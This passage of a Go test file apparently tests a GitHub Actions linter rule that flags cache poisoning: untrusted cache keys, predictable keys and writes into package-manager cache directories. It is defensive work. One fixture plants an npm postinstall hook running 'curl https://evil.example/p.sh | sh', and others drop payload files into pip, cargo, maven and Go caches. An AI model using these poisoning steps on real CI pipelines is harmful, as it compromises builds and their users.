		t.Errorf("Expected direct cache poisoning message, got: %s", errors[0].Description)
	}
	if !strings.Contains(errors[0].Description, "github.event.pull_request.head.ref") {
		t.Errorf("Expected message to contain untrusted input path, got: %s", errors[0].Description)
	}
}

func TestCachePoisoningRule_DirectCachePoison_UntrustedRestoreKeys(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action with untrusted input in restore-keys
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key":  {Value: &ast.String{Value: "npm-${{ github.sha }}", Pos: &ast.Position{Line: 11, Col: 14}}},
				"restore-keys": {Value: &ast.String{
					Value: "npm-${{ github.head_ref }}",
					Pos:   &ast.Position{Line: 13, Col: 22},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 1 {
		t.Fatalf("Expected 1 error for untrusted restore-keys, got %d", len(errors))
	}

	if !strings.Contains(errors[0].Description, "restore-keys") {
		t.Errorf("Expected message to mention restore-keys, got: %s", errors[0].Description)
	}
}

func TestCachePoisoningRule_DirectCachePoison_UntrustedPath(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action with untrusted input in path
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{
					Value: "${{ github.event.pull_request.title }}",
					Pos:   &ast.Position{Line: 12, Col: 15},
				}},
				"key": {Value: &ast.String{Value: "cache-${{ github.sha }}", Pos: &ast.Position{Line: 11, Col: 14}}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 1 {
		t.Fatalf("Expected 1 error for untrusted path, got %d", len(errors))
	}

	if !strings.Contains(errors[0].Description, "path") {
		t.Errorf("Expected message to mention path, got: %s", errors[0].Description)
	}
}

func TestCachePoisoningRule_DirectCachePoison_SafeKey(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action with safe inputs (github.sha, hashFiles, static values)
	// Note: In PR workflows, key must include github.sha to avoid predictable key attacks
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key": {Value: &ast.String{
					Value: "npm-${{ runner.os }}-${{ github.sha }}-${{ hashFiles('**/package-lock.json') }}",
					Pos:   &ast.Position{Line: 11, Col: 14},
				}},
				"restore-keys": {Value: &ast.String{
					Value: "npm-${{ runner.os }}-",
					Pos:   &ast.Position{Line: 13, Col: 22},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 0 {
		t.Errorf("Expected 0 errors for safe cache inputs, got %d", len(errors))
		for _, err := range errors {
			t.Logf("Error: %s", err.Description)
		}
	}
}

func TestCachePoisoningRule_DirectCachePoison_MultipleUntrustedInputs(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action with untrusted input in both key and restore-keys
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key": {Value: &ast.String{
					Value: "npm-${{ github.event.pull_request.title }}",
					Pos:   &ast.Position{Line: 11, Col: 14},
				}},
				"restore-keys": {Value: &ast.String{
					Value: "npm-${{ github.head_ref }}",
					Pos:   &ast.Position{Line: 13, Col: 22},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 2 {
		t.Fatalf("Expected 2 errors for multiple untrusted inputs, got %d", len(errors))
	}
}

func TestCachePoisoningRule_DirectCachePoison_CombinedWithIndirect(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	// With unsafe trigger, we can have both indirect and direct cache poisoning
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request_target"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Unsafe checkout
	checkoutStep := &ast.Step{
		Pos: &ast.Position{Line: 5, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/checkout@v4"},
			Inputs: map[string]*ast.Input{
				"ref": {Value: &ast.String{Value: "${{ github.head_ref }}"}},
			},
		},
	}
	_ = rule.VisitStep(checkoutStep)

	// Cache action with untrusted input in key (direct) + used after unsafe checkout (indirect)
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key": {Value: &ast.String{
					Value: "npm-${{ github.event.pull_request.title }}",
					Pos:   &ast.Position{Line: 11, Col: 14},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	// Should have 2 errors: one for direct (untrusted key) and one for indirect (unsafe checkout + cache)
	if len(errors) != 2 {
		t.Fatalf("Expected 2 errors (direct + indirect), got %d", len(errors))
	}

	hasDirectError := false
	hasIndirectError := false
	for _, err := range errors {
		if strings.Contains(err.Description, "cache poisoning via untrusted input") {
			hasDirectError = true
		}
		if strings.Contains(err.Description, "cache poisoning risk:") {
			hasIndirectError = true
		}
	}

	if !hasDirectError {
		t.Error("Expected direct cache poisoning error")
	}
	if !hasIndirectError {
		t.Error("Expected indirect cache poisoning error")
	}
}

func TestCachePoisoningRule_DirectCacheDirectoryWrite(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name          string
		script        string
		wantErrors    int
		wantSubstring string
	}{
		{
			name: "mkdir writes npm cache directory",
			script: `mkdir -p ~/.npm/_cacache/content-v2/sha512
cat > ~/.npm/_cacache/content-v2/sha512/malicious <<'PAYLOAD'
{"scripts":{"postinstall":"curl https://evil.example/p.sh | sh"}}
PAYLOAD`,
			wantErrors:    2,
			wantSubstring: "~/.npm/_cacache",
		},
		{
			name:          "mkdir writes npm cache directory without trailing slash",
			script:        `mkdir -p ~/.npm/_cacache`,
			wantErrors:    1,
			wantSubstring: "~/.npm/_cacache",
		},
		{
			name:          "cp writes pip cache directory",
			script:        `cp payload.whl ~/.cache/pip/wheels/payload.whl`,
			wantErrors:    1,
			wantSubstring: "~/.cache/pip",
		},
		{
			name:          "mkdir writes cargo registry cache",
			script:        `mkdir -p ~/.cargo/registry/src/malicious`,
			wantErrors:    1,
			wantSubstring: "~/.cargo/registry",
		},
		{
			name:          "touch writes gradle cache",
			script:        `touch ~/.gradle/caches/modules-2/files-2.1/payload`,
			wantErrors:    1,
			wantSubstring: "~/.gradle/caches",
		},
		{
			name:          "printf redirects into maven repository cache",
			script:        `printf '%s\n' payload > ~/.m2/repository/com/example/payload.jar`,
			wantErrors:    1,
			wantSubstring: "~/.m2/repository",
		},
		{
			name:          "install writes go module cache",
			script:        `install -D payload ~/go/pkg/mod/cache/download/example.com/mod/@v/v1.0.0.zip`,
			wantErrors:    1,
			wantSubstring: "~/go/pkg/mod/cache",
		},
		{
			name:          "sudo wrapper still writes npm cache directory",
			script:        `sudo -E mkdir -p ~/.npm/_cacache/content-v2/sha512`,
			wantErrors:    1,
			wantSubstring: "~/.npm/_cacache",
		},
		{
			name:          "env wrapper still writes npm cache directory",
			script:        `env FOO=bar mkdir -p ~/.npm/_cacache/content-v2/sha512`,
			wantErrors:    1,
			wantSubstring: "~/.npm/_cacache",
		},
		{
			name:          "chained command writes npm cache directory",
			script:        `sudo mkdir -p ~/.npm/_cacache && echo ok`,
			wantErrors:    1,
			wantSubstring: "~/.npm/_cacache",
		},
		{
			name:          "cp to pip cache followed by chained command",
			script:        `cp payload.whl ~/.cache/pip/wheels/payload.whl && echo done`,
			wantErrors:    1,
			wantSubstring: "~/.cache/pip",
		},
		{
			name:          "pipe into tee writes npm cache directory",
			script:        `printf payload | tee ~/.npm/_cacache/content-v2/sha512/malicious`,
			wantErrors:    1,
			wantSubstring: "~/.npm/_cacache",
		},
		{
			name:          "shell wrapper writes npm cache directory",
			script:        `sh -c 'mkdir -p ~/.npm/_cacache/content-v2/sha512'`,
			wantErrors:    1,
			wantSubstring: "~/.npm/_cacache",
		},
		{
			name:          "package manager cache command is not direct write",
			script:        `npm cache verify`,
			wantErrors:    0,
			wantSubstring: "",
		},
		{
			name:          "cache directory read is not direct write",
			script:        `ls ~/.npm/_cacache/content-v2/sha512`,
			wantErrors:    0,
			wantSubstring: "",
		},
		{
			name:          "echoing cache directory path is not direct write",
			script:        `echo ~/.npm/_cacache/content-v2/sha512`,
			wantErrors:    0,
			wantSubstring: "",
		},
		{
			name:          "cat reads cache directory file without redirection",
			script:        `cat ~/.npm/_cacache/content-v2/sha512/cache-entry`,
			wantErrors:    0,
			wantSubstring: "",
		},
		{
			name:          "copying from cache directory is not direct write",
			script:        `cp ~/.cache/pip/wheels/pkg.whl ./pkg.whl`,
			wantErrors:    0,
			wantSubstring: "",
		},
		{
			name:          "chained read after unrelated write is not cache directory write",
			script:        `mkdir -p ./tmp && ls ~/.npm/_cacache/content-v2/sha512`,
			wantErrors:    0,
			wantSubstring: "",
		},
		{
			name:          "sibling directory with similar prefix is not cache directory",
			script:        `mkdir -p ~/.npm/_cacache-old`,
			wantErrors:    0,
			wantSubstring: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			rule := NewCachePoisoningRule()
			workflow := &ast.Workflow{
				On: []ast.Event{
					&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
				},
			}
			_ = rule.VisitWorkflowPre(workflow)
			_ = rule.VisitJobPre(&ast.Job{})

			step := &ast.Step{
				Pos: &ast.Position{Line: 10, Col: 1},
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.script,
						Pos:   &ast.Position{Line: 11, Col: 9},
					},
				},
			}
			_ = rule.VisitStep(step)

			errors := rule.Errors()
			if len(errors) != tt.wantErrors {
				t.Fatalf("Expected %d errors, got %d: %#v", tt.wantErrors, len(errors), errors)
			}
			if tt.wantSubstring != "" && !strings.Contains(errors[0].Description, tt.wantSubstring) {
				t.Fatalf("Expected error to contain %q, got %q", tt.wantSubstring, errors[0].Description)
			}
		})
	}
}

func TestCachePoisoningRule_DirectCacheDirectoryWriteBeforeCacheSave(t *testing.T) {
	t.Parallel()

	rule := NewCachePoisoningRule()
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)
	_ = rule.VisitJobPre(&ast.Job{})

	writeStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `echo "payload" >> ~/.npm/_cacache/content-v2/sha512/malicious`,
				Pos:   &ast.Position{Line: 11, Col: 9},
			},
		},
	}
	_ = rule.VisitStep(writeStep)

	saveStep := &ast.Step{
		Pos: &ast.Position{Line: 12, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache/save@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 14, Col: 15}}},
				"key":  {Value: &ast.String{Value: "npm-${{ github.sha }}", Pos: &ast.Position{Line: 15, Col: 14}}},
			},
		},
	}
	_ = rule.VisitStep(saveStep)

	errors := rule.Errors()
	if len(errors) != 2 {
		t.Fatalf("Expected direct write and cache save errors, got %d: %#v", len(errors), errors)
	}
	if !strings.Contains(errors[1].Description, "actions/cache/save follows direct writes") {
		t.Fatalf("Expected cache save follow-up warning, got %q", errors[1].Description)
	}
	if !strings.Contains(errors[1].Description, "~/.npm/_cacache") {
		t.Fatalf("Expected cache save warning to mention cache directory, got %q", errors[1].Description)
	}
}

// Tests for new cache poisoning patterns (predictable keys, release workflows)

func TestCachePoisoningRule_PredictableCacheKey(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	// PR workflow with predictable cache key (hashFiles only, no github.sha)
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action with predictable key (vulnerable to Dependabot attack)
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key": {Value: &ast.String{
					Value: "npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}",
					Pos:   &ast.Position{Line: 11, Col: 14},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 1 {
		t.Fatalf("Expected 1 error for predictable cache key, got %d", len(errors))
	}

	if !strings.Contains(errors[0].Description, "predictable key") {
		t.Errorf("Expected predictable key warning, got: %s", errors[0].Description)
	}
}

func TestCachePoisoningRule_PredictableCacheKey_SafeWithGithubSha(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	// PR workflow with unpredictable cache key (includes github.sha)
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action with unpredictable key (safe)
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key": {Value: &ast.String{
					Value: "npm-${{ runner.os }}-${{ github.sha }}-${{ hashFiles('**/package-lock.json') }}",
					Pos:   &ast.Position{Line: 11, Col: 14},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 0 {
		t.Errorf("Expected 0 errors for unpredictable cache key with github.sha, got %d", len(errors))
		for _, err := range errors {
			t.Logf("Error: %s", err.Description)
		}
	}
}

func TestCachePoisoningRule_PredictableCacheKey_SafeOnPush(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	// Push workflow - predictable keys are less risky (not PR context)
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action with predictable key but on push trigger (safe)
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key": {Value: &ast.String{
					Value: "npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}",
					Pos:   &ast.Position{Line: 11, Col: 14},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 0 {
		t.Errorf("Expected 0 errors for push workflow, got %d", len(errors))
		for _, err := range errors {
			t.Logf("Error: %s", err.Description)
		}
	}
}

func TestCachePoisoningRule_ReleaseWorkflowCache(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	// Release workflow with cache (high-risk)
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "release"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action in release workflow
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key": {Value: &ast.String{
					Value: "npm-${{ github.sha }}",
					Pos:   &ast.Position{Line: 11, Col: 14},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 1 {
		t.Fatalf("Expected 1 error for release workflow cache, got %d", len(errors))
	}

	if !strings.Contains(errors[0].Description, "release workflow") {
		t.Errorf("Expected release workflow warning, got: %s", errors[0].Description)
	}
}

func TestCachePoisoningRule_DeploymentWorkflowCache(t *testing.T) {
	t.Parallel()
	rule := NewCachePoisoningRule()

	// Deployment workflow with cache (high-risk)
	workflow := &ast.Workflow{
		On: []ast.Event{
			&ast.WebhookEvent{Hook: &ast.String{Value: "deployment"}},
		},
	}
	_ = rule.VisitWorkflowPre(workflow)

	job := &ast.Job{}
	_ = rule.VisitJobPre(job)

	// Cache action in deployment workflow
	cacheStep := &ast.Step{
		Pos: &ast.Position{Line: 10, Col: 1},
		Exec: &ast.ExecAction{
			Uses: &ast.String{Value: "actions/cache@v4"},
			Inputs: map[string]*ast.Input{
				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 12, Col: 15}}},
				"key": {Value: &ast.String{
					Value: "npm-${{ github.sha }}",
					Pos:   &ast.Position{Line: 11, Col: 14},
				}},
			},
		},
	}
	_ = rule.VisitStep(cacheStep)

	errors := rule.Errors()
	if len(errors) != 1 {
		t.Fatalf("Expected 1 error for deployment workflow cache, got %d", len(errors))
	}

	if !strings.Contains(errors[0].Description, "release workflow") {
		t.Errorf("Expected release workflow warning, got: %s", errors[0].Description)
	}
}

// Tests for cache hierarchy exploitation and cache eviction risk

func TestCachePoisoningRule_CacheHierarchyExploitation(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name           string
		triggers       []ast.Event
		expectedErrors int
		errorContains  string
	}{
		{
			name: "external trigger + push to default branch",
			triggers: []ast.Event{
				&ast.WorkflowDispatchEvent{},
				&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
			},
			expectedErrors: 1,
			errorContains:  "cache hierarchy exploitation risk",
		},
		{
			name: "schedule + push to default branch",
			triggers: []ast.Event{
				&ast.ScheduledEvent{},
				&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
			},
			expectedErrors: 1,
			errorContains:  "cache hierarchy exploitation risk",
		},
		{
			name: "repository_dispatch only (no push)",
			triggers: []ast.Event{
				&ast.RepositoryDispatchEvent{},
			},
			expectedErrors: 1,
			errorContains:  "cache hierarchy exploitation risk",
		},
		{
			name: "workflow_dispatch only (no push)",
			triggers: []ast.Event{
				&ast.WorkflowDispatchEvent{},
			},
			expectedErrors: 1,
			errorContains:  "writes to default branch cache",
		},
		{
			name: "push only (safe)",
			triggers: []ast.Event{
				&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
			},
			expectedErrors: 0,
		},
		{
			name: "pull_request only (safe)",
			triggers: []ast.Event{
				&ast.WebhookEvent{Hook: &ast.String{Value: "pull_request"}},
			},
			expectedErrors: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			rule := NewCachePoisoningRule()

			workflow := &ast.Workflow{
				On: tt.triggers,
			}
			_ = rule.VisitWorkflowPre(workflow)

			job := &ast.Job{}
			_ = rule.VisitJobPre(job)

			// Add a cache action to trigger the check
			cacheStep := &ast.Step{
				Pos: &ast.Position{Line: 10, Col: 1},
				Exec: &ast.ExecAction{
					Uses:   &ast.String{Value: "actions/cache@v3"},
					Inputs: map[string]*ast.Input{},
				},
			}
			_ = rule.VisitStep(cacheStep)

			errors := rule.Errors()
			if len(errors) != tt.expectedErrors {
				t.Errorf("Expected %d errors, got %d", tt.expectedErrors, len(errors))
				for i, e := range errors {
					t.Logf("Error %d: %s", i, e.Description)
				}
			}

			if tt.expectedErrors > 0 && tt.errorContains != "" {
				found := false
				for _, e := range errors {
					if strings.Contains(e.Description, tt.errorContains) {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("Expected error containing %q, got %v", tt.errorContains, errors)
				}
			}
		})
	}
}

func TestCachePoisoningRule_CacheEvictionRisk(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name           string
		cacheCount     int
		expectedErrors int
	}{
		{
			name:           "4 cache actions (safe)",
			cacheCount:     4,
			expectedErrors: 0,
		},
		{
			name:           "5 cache actions (warning)",
			cacheCount:     5,
			expectedErrors: 1,
		},
		{
			name:           "10 cache actions (warning)",
			cacheCount:     10,
			expectedErrors: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			rule := NewCachePoisoningRule()

			workflow := &ast.Workflow{
				Name: &ast.String{Value: "test", Pos: &ast.Position{Line: 1, Col: 1}},
				On: []ast.Event{
					&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
				},
			}
			_ = rule.VisitWorkflowPre(workflow)

			job := &ast.Job{}
			_ = rule.VisitJobPre(job)

			// Add multiple cache actions
			for i := 0; i < tt.cacheCount; i++ {
				cacheStep := &ast.Step{
					Pos: &ast.Position{Line: 10 + i, Col: 1},
					Exec: &ast.ExecAction{
						Uses:   &ast.String{Value: "actions/cache@v3"},
						Inputs: map[string]*ast.Input{},
					},
				}
				_ = rule.VisitStep(cacheStep)
			}

			_ = rule.VisitJobPost(job)
			_ = rule.VisitWorkflowPost(workflow)

			errors := rule.Errors()
			if len(errors) != tt.expectedErrors {
				t.Errorf("Expected %d errors, got %d", tt.expectedErrors, len(errors))
				for i, e := range errors {
					t.Logf("Error %d: %s", i, e.Description)
				}
			}

			if tt.expectedErrors > 0 {
				found := false
				for _, e := range errors {
					if strings.Contains(e.Description, "cache eviction risk") {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("Expected error containing 'cache eviction risk'")
				}
			}
		})
	}
}

func TestCachePoisoningRule_IsPushToDefaultBranch(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		event    *ast.WebhookEvent
		expected bool
	}{
		{
			name: "no branch filter (includes default)",
			event: &ast.WebhookEvent{
				Hook:     &ast.String{Value: "push"},
				Branches: nil,
			},
			expected: true,
		},
		{
			name: "main branch filter",
			event: &ast.WebhookEvent{
				Hook: &ast.String{Value: "push"},
				Branches: &ast.WebhookEventFilter{
					Values: []*ast.String{{Value: "main"}},
				},
			},
			expected: true,
		},
		{
			name: "master branch filter",
			event: &ast.WebhookEvent{
				Hook: &ast.String{Value: "push"},
				Branches: &ast.WebhookEventFilter{
					Values: []*ast.String{{Value: "master"}},
				},
			},
			expected: true,
		},
		{
			name: "wildcard filter",
			event: &ast.WebhookEvent{
				Hook: &ast.String{Value: "push"},
				Branches: &ast.WebhookEventFilter{
					Values: []*ast.String{{Value: "**"}},
				},
			},
			expected: true,
		},
		{
			name: "feature branch only",
			event: &ast.WebhookEvent{
				Hook: &ast.String{Value: "push"},
				Branches: &ast.WebhookEventFilter{
					Values: []*ast.String{{Value: "feature/*"}},
				},
			},
			expected: false,
		},
		{
			name: "release branch only",
			event: &ast.WebhookEvent{
				Hook: &ast.String{Value: "push"},
				Branches: &ast.WebhookEventFilter{
					Values: []*ast.String{{Value: "release-*"}},
				},
			},
			expected: false,
		},
		{
			name: "tags only (no branches)",
			event: &ast.WebhookEvent{
				Hook:     &ast.String{Value: "push"},
				Branches: nil,
				Tags: &ast.WebhookEventFilter{
					Values: []*ast.String{{Value: "v*"}},
				},
			},
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			rule := NewCachePoisoningRule()
			got := rule.isPushToDefaultBranch(tt.event)
			if got != tt.expected {
				t.Errorf("isPushToDefaultBranch() = %v, want %v", got, tt.expected)
			}
		})
	}
}
